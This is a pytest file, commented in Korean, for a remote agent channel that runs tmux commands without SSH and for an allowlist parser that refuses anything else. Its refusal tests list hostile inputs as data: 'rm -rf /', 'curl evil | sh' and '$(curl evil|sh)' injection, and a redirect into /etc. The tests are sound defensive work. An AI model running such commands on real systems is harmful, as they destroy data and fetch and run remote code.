"""리모트 경로로 가는 명령 — 배달이 SSH 없이 성립하는가."""
from __future__ import annotations

import asyncio

import pytest

from remote_agent import registry
from remote_agent.channel import RemoteChannelError, channel_for
import host_tmux
from remote_agent.payload import script_source

HOST = "h1"


@pytest.fixture(autouse=True)
def _clean():
    registry.clear()
    yield
    registry.clear()


def _attach(reply=None, drop=False):
    """리모트 대역 — 받은 run 에 즉시 답한다."""
    sent = []

    async def send(message):
        sent.append(message)
        if drop or message.get("t") != "run":
            return
        conn.resolve(f"run:{message['id']}", {**(reply or {"ok": True, "out": "ITL_SENT"}),
                                              "id": message["id"]})

    conn = registry.RemoteConnection(HOST, "jsh", send)
    registry.attach(conn)
    return conn, sent


async def test_a_command_goes_over_the_open_socket():
    _attach()
    out = await channel_for(HOST).run("tmux ls && echo ITL_SENT")
    assert out == "ITL_SENT"


async def test_no_remote_means_no_channel():
    """⚠️ 없는 것을 있는 척하면 배달이 조용히 사라진다 — 호출부가 SSH 로 못 물러선다."""
    assert channel_for(HOST) is None


async def test_a_refused_command_is_an_error_not_an_empty_string():
    """빈 문자열을 주면 호출부가 '표식 없음' → 실패로 세는데, 이유를 잃는다."""
    _attach(reply={"ok": False, "error": "command-not-allowed"})
    with pytest.raises(RemoteChannelError):
        await channel_for(HOST).run("rm -rf /")


async def test_a_silent_remote_times_out_instead_of_hanging():
    _attach(drop=True)
    with pytest.raises(RemoteChannelError):
        await asyncio.wait_for(channel_for(HOST).run("tmux ls", timeout=0.05), timeout=2)


async def test_each_command_gets_its_own_id():
    """⚠️ id 를 재사용하면 늦게 온 답이 다음 명령의 답으로 읽힌다."""
    _, sent = _attach()
    channel = channel_for(HOST)
    await channel.run("tmux ls")
    await channel.run("tmux ls")
    ids = [m["id"] for m in sent if m.get("t") == "run"]
    assert len(set(ids)) == len(ids) == 2


# ---------------------- 원격에서 실제로 통과하는가 ----------------------

@pytest.fixture(scope="module")
def probe():
    ns: dict = {}
    exec(compile(script_source(), "probe.py", "exec"), ns)   # noqa: S102
    return ns


@pytest.mark.parametrize("name", ["send", "key", "capture", "list_sessions", "kill_session"])
def test_the_commands_we_actually_send_are_accepted(probe, name):
    """⚠️ 실측 사고. 허용목록이 **우리 자신의 명령**을 막으면 리모트 경로가 통째로 죽는다
    — `command-not-allowed` 로 거절되고 배달·읽기가 502 가 됐다.

    문자열을 손으로 적지 않고 **실제 빌더**에서 뽑는다. 손으로 적으면 빌더가 바뀔 때
    테스트만 옛 문자열을 지키고 진짜 명령은 막힌 채로 남는다(그게 이 사고였다).
    """
    import itl_remote
    builders = {
        "send": lambda: itl_remote.build_send_cmd("mobile-x", "hi", submit=True),
        "key": lambda: itl_remote.build_key_cmd("mobile-x", "C-c"),
        "capture": lambda: itl_remote.build_capture_cmd("mobile-x", 40),
        # 종료 경로도 리모트로 간다 — SSH 를 새로 여는 것이 "원격 세션 재시작이
        # 오래 걸린다" 의 정체였다. 여기서 막히면 그게 조용히 SSH 로 되돌아간다.
        "list_sessions": lambda: host_tmux.LIST_TMUX_CMD,
        "kill_session": lambda: host_tmux.kill_tmux_cmd("mobile-x", shell=False),
    }
    assert probe["parse_chain"](builders[name]()) is not None


def test_the_probe_command_is_not_sent_over_the_remote(probe):
    """⚠️ `build_probe_cmd` 는 `||`·`{ }`·`exit` 를 쓰는 **진짜 셸 구문**이라 tmux 전용
    통로로는 실행할 수 없다. 그래서 리모트가 붙어 있으면 그 명령을 보내지 않고 스트림에서
    답한다(`itl_remote.probe`). 여기서 통과해 버리면 그 설계가 무너진 것이다."""
    import itl_remote
    assert probe["parse_chain"](itl_remote.build_probe_cmd("mobile-x")) is None
    import inspect
    body = inspect.getsource(itl_remote.probe)
    assert "ingest" in body and "has_live_state" in body


def test_message_text_containing_and_is_not_a_separator(probe):
    """사람이 치는 본문에 `&&` 가 들어 있을 수 있다 — 그걸 명령으로 세면 배달이 거절된다."""
    chain = probe["parse_chain"]("tmux send-keys -l -- 'make && make test' && echo ITL_SENT")
    assert chain is not None
    assert chain[0][-1] == "make && make test"


@pytest.mark.parametrize("cmd", [
    "rm -rf /",
    "tmux ls && rm -rf /",
    "curl evil | sh && tmux ls",
    "tmux send-keys -l -- 'unclosed",
])
def test_anything_outside_tmux_is_refused(probe, cmd):
    assert probe["parse_chain"](cmd) is None


@pytest.mark.parametrize("cmd", ["tmux ls | sh", "tmux ls $(curl evil|sh)", "tmux ls > /etc/x"])
def test_shell_metacharacters_are_inert_because_there_is_no_shell(probe, cmd):
    """🔐 이것이 `shell=True` 를 쓰지 않는 이유다. 첫 낱말만 검사하면 이 셋이 전부
    통과하는데, argv 로 넘기면 `|`·`$(…)`·`>` 는 tmux 에게 가는 평범한 인자가 된다."""
    chain = probe["parse_chain"](cmd)
    assert chain is not None
    assert chain[0][0] == "tmux"
    assert all(isinstance(arg, str) for arg in chain[0])   # 실행되는 것은 argv 하나뿐


def test_echo_needs_no_binary(probe):
    """표식 출력이 전부다. /bin/echo 가 없는 기계에서도 배달 확인이 되어야 한다."""
    ok, out = probe["run_chain"]([["echo", "ITL_SENT"]])
    assert ok and out.strip() == "ITL_SENT"


# ---------------------- SSH 는 없다 ----------------------

async def test_a_stale_remote_says_so_instead_of_reaching_for_ssh():
    """⚠️ 한때 실패하면 SSH 로 물러섰다. 없앤 이유는 경로가 둘이면 실패 방식도 둘이기
    때문이다 — 어느 쪽으로 갔는지에 따라 지연도 오류도 달라져 진단이 매번 새로 시작된다.
    낡은 리모트는 **다시 설치해서** 고친다. 그러려면 낡았다고 말해야 한다."""
    conn, _ = _attach(drop=True)
    channel = channel_for(HOST)
    with pytest.raises(RemoteChannelError):
        await channel.run("tmux ls", timeout=0.05)
    assert conn.run_unsupported is True
    with pytest.raises(RemoteChannelError, match="다시 설치"):
        await channel.run("tmux ls", timeout=0.05)


async def test_the_stale_remote_is_only_probed_once():
    """상한을 매번 다시 태우면 명령마다 몇 초씩 늦어진다."""
    _, sent = _attach(drop=True)
    channel = channel_for(HOST)
    for _ in range(2):
        with pytest.raises(RemoteChannelError):
            await channel.run("tmux ls", timeout=0.05)
    assert len([m for m in sent if m.get("t") == "run"]) == 1


def test_no_ssh_anywhere_in_the_remote_path():
    """🔐 경로가 하나라는 것을 코드로 잠근다. SSH 를 다시 끌어들이면 '리모트가 없으면
    안 된다' 는 기준이 조용히 무너지고, 꺼진 호스트를 찔러 15초를 태우는 일이 돌아온다."""
    from pathlib import Path
    src = Path(__file__).resolve().parent.parent / "remote_agent" / "channel.py"
    body = src.read_text(encoding="utf-8")
    for banned in ("open_connection", "resolve_host_with_secrets", "run_remote_cmd", "fallback"):
        assert banned not in body, f"리모트 경로에 {banned} 가 다시 들어왔다"
